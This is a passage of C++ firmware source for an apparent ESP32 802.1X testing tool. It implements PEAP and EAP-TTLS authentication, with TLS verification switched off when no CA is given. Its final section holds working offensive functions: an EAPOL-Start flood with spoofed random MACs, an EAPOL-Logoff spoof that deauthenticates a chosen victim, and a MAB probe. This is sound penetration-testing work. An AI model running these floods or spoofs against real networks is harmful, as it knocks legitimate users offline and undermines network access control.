                Serial.println("   <- inner MS-CHAPv2 Challenge");

                esp_fill_random(peerChallenge, 16);
                mschapGenerateNTResponse(authChallenge, peerChallenge,
                                         username, password, ntResponse);
                mschapGenerateAuthenticatorResponse(password, ntResponse,
                                                    peerChallenge, authChallenge,
                                                    username, authRespStr);

                // Response value: PeerChallenge(16) Reserved(8) NT-Resp(24) Flags(1)
                uint8_t value[49];
                memcpy(value, peerChallenge, 16);
                memset(value + 16, 0, 8);
                memcpy(value + 24, ntResponse, 24);
                value[48] = 0x00;

                size_t ul = strlen(username);
                int msLen = 4 + 1 + 49 + (int)ul;  // hdr+valuesize+value+name
                int len = 5 + msLen;
                if (len > outCap) return 0;
                out[0] = EAP_RESPONSE; out[1] = iid;
                out[2] = (uint8_t)(len >> 8); out[3] = (uint8_t)len;
                out[4] = EAP_MSCHAPV2;
                out[5] = 0x02;                     // OpCode: Response
                out[6] = mschapId;
                out[7] = (uint8_t)(msLen >> 8); out[8] = (uint8_t)msLen;
                out[9] = 49;                       // Value-Size
                memcpy(out + 10, value, 49);
                memcpy(out + 59, username, ul);
                Serial.println("   -> inner MS-CHAPv2 Response");
                return len;
            }

            if (opcode == 3) {                     // Success request
                // Message after opcode is "S=<hex> M=<msg>"; verify S=.
                bool verified = false;
                if (inLen > 6) {
                    const char *msg = (const char *)(in + 6);
                    int mlen = inLen - 6;
                    for (int i = 0; i + 41 <= mlen; i++) {
                        if (msg[i] == 'S' && msg[i + 1] == '=') {
                            if (memcmp(msg + i, authRespStr, 42) == 0) verified = true;
                            break;
                        }
                    }
                }
                Serial.printf("   <- inner MS-CHAPv2 Success (server response %s)\r\n",
                              verified ? "VERIFIED" : "not verified");
                if (!verified) local.authenticatorVerifyFailed = true;
                // Respond with a bare Success (OpCode 3).
                if (outCap < 6) return 0;
                out[0] = EAP_RESPONSE; out[1] = iid;
                out[2] = 0; out[3] = 6;
                out[4] = EAP_MSCHAPV2;
                out[5] = 0x03;
                Serial.println("   -> inner MS-CHAPv2 Success ack");
                return 6;
            }

            if (opcode == 4) {                     // Failure
                Serial.println("   <- inner MS-CHAPv2 Failure (bad credentials)");
                local.rejected = true;
                innerDone = true;
                return 0;
            }
            return 0;
        }

        // --- inner EAP-Request/EAP-TLV (result) ---
        if (itype == EAP_TLV) {
            // Reflect a success Result TLV (type 3, value 1).
            Serial.println("   <- inner EAP-TLV Result");
            if (outCap < 11) return 0;
            int len = 11;
            out[0] = EAP_RESPONSE; out[1] = iid;
            out[2] = 0; out[3] = (uint8_t)len;
            out[4] = EAP_TLV;
            out[5] = 0x80; out[6] = 0x03;          // Mandatory + Result TLV
            out[7] = 0x00; out[8] = 0x02;          // length 2
            out[9] = 0x00; out[10] = 0x01;         // Result: success
            Serial.println("   -> inner EAP-TLV Result: success");
            return len;
        }

        // Unknown inner method: NAK back to MS-CHAPv2.
        Serial.printf("   <- inner EAP type %u -- NAK -> MS-CHAPv2\r\n", itype);
        if (outCap < 6) return 0;
        out[0] = EAP_RESPONSE; out[1] = iid;
        out[2] = 0; out[3] = 6;
        out[4] = EAP_NAK;
        out[5] = EAP_MSCHAPV2;
        return 6;
    };

    // ---- EAP state machine ---------------------------------------------------
    bool handshakeDone = false;
    bool started       = false;
    uint8_t eap[EAPTLS_FRAG_MAX + 64];
    uint32_t deadline = millis() + timeoutMs;
    int starts = 0;

    auto driveHandshake = [&]() -> int {
        io.txLen = io.txSent = 0;
        int r = mbedtls_ssl_handshake(&ssl);
        io.rxLen = io.rxPos = 0;
        if (r == 0) handshakeDone = true;
        return r;
    };

    auto sendTxFragment = [&](uint8_t pid) {
        size_t remaining = io.txLen - io.txSent;
        size_t frag = (remaining > EAPTLS_FRAG_MAX) ? EAPTLS_FRAG_MAX : remaining;
        bool   more  = (frag < remaining);
        bool   first = (io.txSent == 0);
        bool   incLen = first && (io.txLen > EAPTLS_FRAG_MAX);
        uint8_t flags = more ? EAPTLS_FLAG_M : 0;
        _sendEapTls(pid, flags, incLen, (uint32_t)io.txLen,
                    io.tx + io.txSent, (uint16_t)frag, EAP_PEAP);
        io.txSent += frag;
    };

    auto sendFlightOrAck = [&](uint8_t pid) {
        if (io.txLen > 0) { io.txSent = 0; sendTxFragment(pid); }
        else              { _sendEapTls(pid, 0, false, 0, nullptr, 0, EAP_PEAP); }
    };

    // After the tunnel is up: decrypt the peer flight, run the inner method,
    // encrypt the reply and queue it for transmission.
    auto runInner = [&](uint8_t pid) {
        io.rxPos = 0;
        uint8_t plain[640];
        int pn = mbedtls_ssl_read(&ssl, plain, sizeof(plain));
        io.txLen = io.txSent = 0;
        if (pn <= 0) { sendFlightOrAck(pid); return; }

        uint8_t reply[640];
        int rlen = buildInner(plain, pn, reply, sizeof(reply));
        if (rlen > 0) {
            io.txLen = io.txSent = 0;
            mbedtls_ssl_write(&ssl, reply, rlen);
        }
        sendFlightOrAck(pid);
    };

    if (!fatal) { _sendEapolStart(); starts++; }

    while (!fatal && (int32_t)(deadline - millis()) > 0) {
        uint32_t remain = deadline - millis();
        int n = _recvEap(eap, sizeof(eap), remain > 2000 ? 2000 : remain);
        if (n < 0) { Serial.println("Aborted."); break; }
        if (n == 0) {
            if (!started && !local.portEnforced && starts < 3) {
                _sendEapolStart(); starts++;
            }
            continue;
        }
        if (n < 4) continue;

        uint8_t code = eap[0];
        uint8_t pid  = eap[1];
        uint8_t type = (n >= 5) ? eap[4] : 0;

        if (code == EAP_SUCCESS) {
            local.portEnforced = local.authenticated = true;
            Serial.println("<- EAP-Success");
            break;
        }
        if (code == EAP_FAILURE) {
            local.portEnforced = true; local.rejected = true;
            Serial.println("<- EAP-Failure");
            break;
        }
        if (code != EAP_REQUEST) continue;

        local.portEnforced = true;

        if (type == EAP_IDENTITY) {
            Serial.println("<- EAP-Request/Identity");
            _sendEap(EAP_RESPONSE, pid, EAP_IDENTITY,
                     (const uint8_t *)outerId, strlen(outerId));
            local.identitySent = true;
            Serial.printf("-> EAP-Response/Identity '%s'\r\n", outerId);
            continue;
        }

        if (type != EAP_PEAP) {
            local.offeredMethod = type;
            Serial.printf("<- EAP-Request/%s (type %u) -- NAK -> PEAP\r\n",
                          _methodName(type), type);
            uint8_t desired = EAP_PEAP;
            _sendEap(EAP_RESPONSE, pid, EAP_NAK, &desired, 1);
            continue;
        }

        // ---- EAP-PEAP packet ----
        local.offeredMethod = EAP_PEAP;
        if (n < 6) continue;
        uint8_t  flags   = eap[5];
        uint16_t dataOff = 6;
        if (flags & EAPTLS_FLAG_L) dataOff += 4;
        int dataLen = (n > dataOff) ? (n - dataOff) : 0;

        if (flags & EAPTLS_FLAG_S) {
            Serial.println("<- EAP-PEAP Start");
            started = true;
            ret = driveHandshake();
            if (ret != 0 && ret != MBEDTLS_ERR_SSL_WANT_READ) { fail("handshake", ret); break; }
            sendFlightOrAck(pid);
            continue;
        }

        if (dataLen > 0) {
            if (io.rxLen + dataLen > io.rxCap) { fail("rx overflow", 0); break; }
            memcpy(io.rx + io.rxLen, eap + dataOff, dataLen);
            io.rxLen += dataLen;

            if (flags & EAPTLS_FLAG_M) {
                _sendEapTls(pid, 0, false, 0, nullptr, 0, EAP_PEAP);  // ACK, more
                continue;
            }

            io.rxPos = 0;
            if (!handshakeDone) {
                ret = driveHandshake();
                if (ret != 0 && ret != MBEDTLS_ERR_SSL_WANT_READ) { fail("handshake", ret); break; }
                sendFlightOrAck(pid);
            } else {
                runInner(pid);
            }
            continue;
        }

        // Empty PEAP request: fragment ACK or keep-alive.
        if (io.txSent < io.txLen) sendTxFragment(pid);
        else _sendEapTls(pid, 0, false, 0, nullptr, 0, EAP_PEAP);
    }

    // ---- Report --------------------------------------------------------------
    if (local.authenticated) {
        Serial.println("=> AUTH SUCCESS: PEAP/MS-CHAPv2 accepted, port authorized.");
        const char *cs = mbedtls_ssl_get_ciphersuite(&ssl);
        if (cs) Serial.printf("   Cipher suite : %s\r\n", cs);
        if (haveCa) {
            uint32_t vr = mbedtls_ssl_get_verify_result(&ssl);
            Serial.printf("   Server cert  : %s\r\n",
                          vr == 0 ? "validated against CA" : "NOT validated (see flags)");
        }
        if (local.authenticatorVerifyFailed)
            Serial.println("   WARNING: server MS-CHAPv2 authenticator response did NOT verify.");
        strncpy(local.detail, "PEAP/MS-CHAPv2 authenticated", sizeof(local.detail) - 1);
    } else if (local.rejected) {
        Serial.println("=> AUTH FAILED: credentials rejected.");
        if (!local.detail[0]) strncpy(local.detail, "rejected", sizeof(local.detail) - 1);
    } else if (fatal) {
        Serial.println("=> PEAP ERROR: tunnel could not complete (see above).");
    } else if (!local.portEnforced) {
        Serial.println("=> No response: port is OPEN (no 802.1X) or supplicant filtered.");
        strncpy(local.detail, "open / no 802.1X", sizeof(local.detail) - 1);
    } else {
        Serial.println("=> INCOMPLETE: dot1x present but PEAP did not finish (timeout).");
        if (!local.detail[0]) strncpy(local.detail, "incomplete", sizeof(local.detail) - 1);
    }
    (void)innerDone;

    // ---- Cleanup -------------------------------------------------------------
    if (io.tx) free(io.tx);
    if (io.rx) free(io.rx);
    mbedtls_ssl_free(&ssl);
    mbedtls_ssl_config_free(&conf);
    mbedtls_x509_crt_free(&cacert);
    mbedtls_ctr_drbg_free(&drbg);
    mbedtls_entropy_free(&entropy);

    if (res) *res = local;
    return local.authenticated;
}

// =============================================================================
// EAP-TTLS  --  inner PAP / MS-CHAPv2 over Diameter AVPs (RFC 5281)
// =============================================================================

// Encode one Diameter/RADIUS AVP. Returns bytes written (data padded to a
// 4-byte boundary). `vendor` of 0 means no vendor id.
static int ttlsPutAvp(uint8_t *p, uint32_t code, bool mandatory,
                      uint32_t vendor, const uint8_t *data, uint32_t dlen)
{
    uint8_t flags = mandatory ? 0x40 : 0x00;
    if (vendor) flags |= 0x80;
    uint32_t hdr = vendor ? 12 : 8;
    uint32_t avplen = hdr + dlen;            // excludes trailing pad
    put32(p, code);
    p[4] = flags;
    p[5] = (uint8_t)(avplen >> 16);
    p[6] = (uint8_t)(avplen >> 8);
    p[7] = (uint8_t)(avplen);
    uint32_t off = 8;
    if (vendor) { put32(p + 8, vendor); off = 12; }
    if (data && dlen) { memcpy(p + off, data, dlen); off += dlen; }
    while (off & 3) p[off++] = 0;            // pad to 4-byte boundary
    return (int)off;
}

bool Dot1xTest::authenticateTtls(const char *identity, const char *username,
                                 const char *password, const char *caPem,
                                 bool innerMschap, uint32_t timeoutMs,
                                 Dot1xResult *res)
{
    Dot1xResult local;
    memset(&local, 0, sizeof(local));

    if (!username || !username[0] || !password) {
        Serial.println("EAP-TTLS: inner username and password are required.");
        strncpy(local.detail, "missing credentials", sizeof(local.detail) - 1);
        if (res) *res = local;
        return false;
    }

    const char *outerId = (identity && identity[0]) ? identity : "anonymous";
    Serial.printf("\r\n802.1X authentication (EAP-TTLS / inner %s)\r\n"
                  "   outer identity : %s\r\n   inner username : %s\r\n",
                  innerMschap ? "MS-CHAPv2" : "PAP", outerId, username);
    Serial.println("(any key aborts)");

    // ---- mbedTLS setup (server auth only) -----------------------------------
    mbedtls_entropy_context  entropy;
    mbedtls_ctr_drbg_context drbg;
    mbedtls_ssl_context      ssl;
    mbedtls_ssl_config       conf;
    mbedtls_x509_crt         cacert;

    mbedtls_entropy_init(&entropy);
    mbedtls_ctr_drbg_init(&drbg);
    mbedtls_ssl_init(&ssl);
    mbedtls_ssl_config_init(&conf);
    mbedtls_x509_crt_init(&cacert);

    EapTlsIo io;
    memset(&io, 0, sizeof(io));
    io.tx = (uint8_t *)malloc(EAPTLS_BUF_SIZE);
    io.rx = (uint8_t *)malloc(EAPTLS_BUF_SIZE);
    io.txCap = io.rxCap = EAPTLS_BUF_SIZE;

    char errbuf[96];
    bool fatal = false;
    int  ret   = 0;

    auto fail = [&](const char *what, int code) {
        if (code) {
            mbedtls_strerror(code, errbuf, sizeof(errbuf));
            Serial.printf("EAP-TTLS: %s failed: -0x%04X %s\r\n", what, -code, errbuf);
            snprintf(local.detail, sizeof(local.detail), "%s err", what);
        } else {
            Serial.printf("EAP-TTLS: %s\r\n", what);
            strncpy(local.detail, what, sizeof(local.detail) - 1);
        }
        fatal = true;
    };

    if (!io.tx || !io.rx) fail("buffer alloc", 0);

    if (!fatal) {
        ret = mbedtls_ctr_drbg_seed(&drbg, mbedtls_entropy_func, &entropy,
                                    (const unsigned char *)"esp32-ttls", 10);
        if (ret) fail("rng seed", ret);
    }

    bool haveCa = (caPem && caPem[0]);
    if (!fatal && haveCa) {
        ret = mbedtls_x509_crt_parse(&cacert, (const unsigned char *)caPem,
                                     strlen(caPem) + 1);
        if (ret) fail("CA parse", ret);
    }
    if (!fatal) {
        ret = mbedtls_ssl_config_defaults(&conf, MBEDTLS_SSL_IS_CLIENT,
                                          MBEDTLS_SSL_TRANSPORT_STREAM,
                                          MBEDTLS_SSL_PRESET_DEFAULT);
        if (ret) fail("ssl config", ret);
    }
    if (!fatal) {
        mbedtls_ssl_conf_min_tls_version(&conf, MBEDTLS_SSL_VERSION_TLS1_2);
        mbedtls_ssl_conf_max_tls_version(&conf, MBEDTLS_SSL_VERSION_TLS1_2);
        mbedtls_ssl_conf_rng(&conf, mbedtls_ctr_drbg_random, &drbg);
        mbedtls_ssl_conf_authmode(&conf,
            haveCa ? MBEDTLS_SSL_VERIFY_OPTIONAL : MBEDTLS_SSL_VERIFY_NONE);
        if (haveCa) mbedtls_ssl_conf_ca_chain(&conf, &cacert, nullptr);
    }
    if (!fatal) {
        ret = mbedtls_ssl_setup(&ssl, &conf);
        if (ret) fail("ssl setup", ret);
    }
    if (!fatal) {
        mbedtls_ssl_set_hostname(&ssl, nullptr);
        mbedtls_ssl_set_bio(&ssl, &io, tlsBioSend, tlsBioRecv, nullptr);
    }

    // Build the inner AVP payload that conveys the credentials.
    auto buildAvps = [&](uint8_t *out, int outCap) -> int {
        int off = 0;
        // User-Name AVP (RADIUS code 1, mandatory).
        off += ttlsPutAvp(out + off, 1, true, 0,
                          (const uint8_t *)username, strlen(username));
        if (!innerMschap) {
            // PAP: User-Password AVP (code 2). Cleartext inside the tunnel.
            off += ttlsPutAvp(out + off, 2, true, 0,
                              (const uint8_t *)password, strlen(password));
        } else {
            // MS-CHAPv2: client generates both challenges.
            uint8_t authChallenge[16], peerChallenge[16], ntResponse[24];
            esp_fill_random(authChallenge, 16);
            esp_fill_random(peerChallenge, 16);
            mschapGenerateNTResponse(authChallenge, peerChallenge,
                                     username, password, ntResponse);
            // MS-CHAP-Challenge (vendor 311, code 11) = AuthenticatorChallenge.
            off += ttlsPutAvp(out + off, 11, true, 311, authChallenge, 16);
            // MS-CHAP2-Response (vendor 311, code 25):
            //   Ident(1) Flags(1) PeerChallenge(16) Reserved(8) NT-Resp(24)
            uint8_t resp[50];
            resp[0] = 0;                 // Ident
            resp[1] = 0;                 // Flags
            memcpy(resp + 2, peerChallenge, 16);
            memset(resp + 18, 0, 8);     // Reserved
            memcpy(resp + 26, ntResponse, 24);
            off += ttlsPutAvp(out + off, 25, true, 311, resp, 50);
        }
        (void)outCap;
        return off;
    };

    // ---- EAP state machine ---------------------------------------------------
    bool handshakeDone = false;
    bool started       = false;
    bool innerSent     = false;
    uint8_t eap[EAPTLS_FRAG_MAX + 64];
    uint32_t deadline = millis() + timeoutMs;
    int starts = 0;

    auto driveHandshake = [&]() -> int {
        io.txLen = io.txSent = 0;
        int r = mbedtls_ssl_handshake(&ssl);
        io.rxLen = io.rxPos = 0;
        if (r == 0) handshakeDone = true;
        return r;
    };

    auto sendTxFragment = [&](uint8_t pid) {
        size_t remaining = io.txLen - io.txSent;
        size_t frag = (remaining > EAPTLS_FRAG_MAX) ? EAPTLS_FRAG_MAX : remaining;
        bool   more  = (frag < remaining);
        bool   first = (io.txSent == 0);
        bool   incLen = first && (io.txLen > EAPTLS_FRAG_MAX);
        uint8_t flags = more ? EAPTLS_FLAG_M : 0;
        _sendEapTls(pid, flags, incLen, (uint32_t)io.txLen,
                    io.tx + io.txSent, (uint16_t)frag, EAP_TTLS);
        io.txSent += frag;
    };

    auto sendFlightOrAck = [&](uint8_t pid) {
        if (io.txLen > 0) { io.txSent = 0; sendTxFragment(pid); }
        else              { _sendEapTls(pid, 0, false, 0, nullptr, 0, EAP_TTLS); }
    };

    // After the tunnel is up: transmit the inner AVP credentials once.
    auto sendInner = [&](uint8_t pid) {
        // Drain any application data the server may have sent (ignored).
        io.rxPos = 0;
        uint8_t scratch[64];
        if (io.rxLen) mbedtls_ssl_read(&ssl, scratch, sizeof(scratch));

        io.txLen = io.txSent = 0;
        if (!innerSent) {
            uint8_t avps[256];
            int alen = buildAvps(avps, sizeof(avps));
            mbedtls_ssl_write(&ssl, avps, alen);
            innerSent = true;
            Serial.printf("   -> inner %s credentials sent (%d AVP bytes)\r\n",
                          innerMschap ? "MS-CHAPv2" : "PAP", alen);
        }
        sendFlightOrAck(pid);
    };

    if (!fatal) { _sendEapolStart(); starts++; }

    while (!fatal && (int32_t)(deadline - millis()) > 0) {
        uint32_t remain = deadline - millis();
        int n = _recvEap(eap, sizeof(eap), remain > 2000 ? 2000 : remain);
        if (n < 0) { Serial.println("Aborted."); break; }
        if (n == 0) {
            if (!started && !local.portEnforced && starts < 3) {
                _sendEapolStart(); starts++;
            }
            continue;
        }
        if (n < 4) continue;

        uint8_t code = eap[0];
        uint8_t pid  = eap[1];
        uint8_t type = (n >= 5) ? eap[4] : 0;

        if (code == EAP_SUCCESS) {
            local.portEnforced = local.authenticated = true;
            Serial.println("<- EAP-Success");
            break;
        }
        if (code == EAP_FAILURE) {
            local.portEnforced = true; local.rejected = true;
            Serial.println("<- EAP-Failure");
            break;
        }
        if (code != EAP_REQUEST) continue;

        local.portEnforced = true;

        if (type == EAP_IDENTITY) {
            Serial.println("<- EAP-Request/Identity");
            _sendEap(EAP_RESPONSE, pid, EAP_IDENTITY,
                     (const uint8_t *)outerId, strlen(outerId));
            local.identitySent = true;
            Serial.printf("-> EAP-Response/Identity '%s'\r\n", outerId);
            continue;
        }

        if (type != EAP_TTLS) {
            local.offeredMethod = type;
            Serial.printf("<- EAP-Request/%s (type %u) -- NAK -> EAP-TTLS\r\n",
                          _methodName(type), type);
            uint8_t desired = EAP_TTLS;
            _sendEap(EAP_RESPONSE, pid, EAP_NAK, &desired, 1);
            continue;
        }

        // ---- EAP-TTLS packet ----
        local.offeredMethod = EAP_TTLS;
        if (n < 6) continue;
        uint8_t  flags   = eap[5];
        uint16_t dataOff = 6;
        if (flags & EAPTLS_FLAG_L) dataOff += 4;
        int dataLen = (n > dataOff) ? (n - dataOff) : 0;

        if (flags & EAPTLS_FLAG_S) {
            Serial.println("<- EAP-TTLS Start");
            started = true;
            ret = driveHandshake();
            if (ret != 0 && ret != MBEDTLS_ERR_SSL_WANT_READ) { fail("handshake", ret); break; }
            sendFlightOrAck(pid);
            continue;
        }

        if (dataLen > 0) {
            if (io.rxLen + dataLen > io.rxCap) { fail("rx overflow", 0); break; }
            memcpy(io.rx + io.rxLen, eap + dataOff, dataLen);
            io.rxLen += dataLen;

            if (flags & EAPTLS_FLAG_M) {
                _sendEapTls(pid, 0, false, 0, nullptr, 0, EAP_TTLS);  // ACK, more
                continue;
            }

            io.rxPos = 0;
            if (!handshakeDone) {
                ret = driveHandshake();
                if (ret != 0 && ret != MBEDTLS_ERR_SSL_WANT_READ) { fail("handshake", ret); break; }
                if (handshakeDone) sendInner(pid);
                else               sendFlightOrAck(pid);
            } else {
                sendInner(pid);
            }
            continue;
        }

        // Empty TTLS request: fragment ACK, or (post-handshake) send creds.
        if (io.txSent < io.txLen) sendTxFragment(pid);
        else if (handshakeDone && !innerSent) sendInner(pid);
        else _sendEapTls(pid, 0, false, 0, nullptr, 0, EAP_TTLS);
    }

    // ---- Report --------------------------------------------------------------
    if (local.authenticated) {
        Serial.printf("=> AUTH SUCCESS: EAP-TTLS/%s accepted, port authorized.\r\n",
                      innerMschap ? "MS-CHAPv2" : "PAP");
        const char *cs = mbedtls_ssl_get_ciphersuite(&ssl);
        if (cs) Serial.printf("   Cipher suite : %s\r\n", cs);
        if (haveCa) {
            uint32_t vr = mbedtls_ssl_get_verify_result(&ssl);
            Serial.printf("   Server cert  : %s\r\n",
                          vr == 0 ? "validated against CA" : "NOT validated (see flags)");
        }
        strncpy(local.detail, "EAP-TTLS authenticated", sizeof(local.detail) - 1);
    } else if (local.rejected) {
        Serial.println("=> AUTH FAILED: credentials rejected.");
        if (!local.detail[0]) strncpy(local.detail, "rejected", sizeof(local.detail) - 1);
    } else if (fatal) {
        Serial.println("=> EAP-TTLS ERROR: tunnel could not complete (see above).");
    } else if (!local.portEnforced) {
        Serial.println("=> No response: port is OPEN (no 802.1X) or supplicant filtered.");
        strncpy(local.detail, "open / no 802.1X", sizeof(local.detail) - 1);
    } else {
        Serial.println("=> INCOMPLETE: dot1x present but EAP-TTLS did not finish (timeout).");
        if (!local.detail[0]) strncpy(local.detail, "incomplete", sizeof(local.detail) - 1);
    }

    // ---- Cleanup -------------------------------------------------------------
    if (io.tx) free(io.tx);
    if (io.rx) free(io.rx);
    mbedtls_ssl_free(&ssl);
    mbedtls_ssl_config_free(&conf);
    mbedtls_x509_crt_free(&cacert);
    mbedtls_ctr_drbg_free(&drbg);
    mbedtls_entropy_free(&entropy);

    if (res) *res = local;
    return local.authenticated;
}

// =============================================================================
// logoff
// =============================================================================
void Dot1xTest::logoff()
{
    _sendEapolLogoff();
    Serial.println("802.1X: EAPOL-Logoff sent.");
}

// =============================================================================
// Offensive EAPOL extras (authorized lab use only)
// =============================================================================
void Dot1xTest::startFlood(uint32_t count, bool randomMac, uint32_t intervalMs)
{
    if (count == 0) count = 1000;
    Serial.printf("\r\nEAPOL-Start flood: %lu frame(s)%s (any key aborts)...\r\n",
                  (unsigned long)count, randomMac ? ", random source MACs" : "");
    uint32_t sent = 0;
    uint8_t mac[6];
    for (uint32_t i = 0; i < count; i++) {
        if (randomMac) {
            uint32_t r1 = esp_random(), r2 = esp_random();
            mac[0] = (r1 & 0xFE) | 0x02; mac[1] = r1 >> 8; mac[2] = r1 >> 16;
            mac[3] = r1 >> 24; mac[4] = r2; mac[5] = r2 >> 8;
        } else {
            memcpy(mac, _mac, 6);
        }
        if (sendEapolFrame(_eth, mac, EAPOL_START, nullptr, 0)) sent++;
        if (Serial.available()) { while (Serial.available()) Serial.read(); break; }
        if (intervalMs) delay(intervalMs);
        if ((i & 0xFF) == 0xFF) Serial.printf("  %lu sent...\r\n", (unsigned long)sent);
    }
    Serial.printf("EAPOL-Start flood done: %lu sent.\r\n", (unsigned long)sent);
}

void Dot1xTest::logoffSpoof(const uint8_t victimMac[6])
{
    char m[18]; macToStr((uint8_t *)victimMac, m);
    Serial.printf("\r\nSpoofing EAPOL-Logoff as %s ...\r\n", m);
    bool ok = sendEapolFrame(_eth, victimMac, EAPOL_LOGOFF, nullptr, 0);
    Serial.println(ok ? "Sent. If the switch honours it, that client is deauthenticated."
                      : "Send failed.");
}

bool Dot1xTest::mabProbe(uint32_t seconds)
{
    Serial.printf("\r\nMAB / 802.1X enforcement probe (%lu s, any key aborts)...\r\n",
                  (unsigned long)seconds);
    if (!_eth.isLinked()) Serial.println("WARNING: link is DOWN; results may be meaningless.");

    uint32_t deadline = millis() + seconds * 1000UL;
    uint8_t eap[256];
    bool enforced = false;
    int starts = 0;
    _sendEapolStart(); starts++;

    while ((int32_t)(deadline - millis()) > 0) {
        uint32_t remain = deadline - millis();
        int n = _recvEap(eap, sizeof(eap), remain > 1500 ? 1500 : remain);
        if (n < 0) { Serial.println("Aborted."); break; }
        if (n == 0) { if (starts < 4) { _sendEapolStart(); starts++; } continue; }
        if (n >= 4 && eap[0] == EAP_REQUEST) {
            enforced = true;
            Serial.printf("EAP-Request seen (type %u) -> port enforces 802.1X.\r\n",
                          n >= 5 ? eap[4] : 0);
            break;
        }
    }
    if (!enforced) {
        Serial.println("No EAP challenge observed.");
        Serial.println("=> Port is OPEN or uses MAC Authentication Bypass (MAB).");
        Serial.println("   Try sending traffic from an allowed MAC to confirm MAB.");
    }
    return enforced;
}

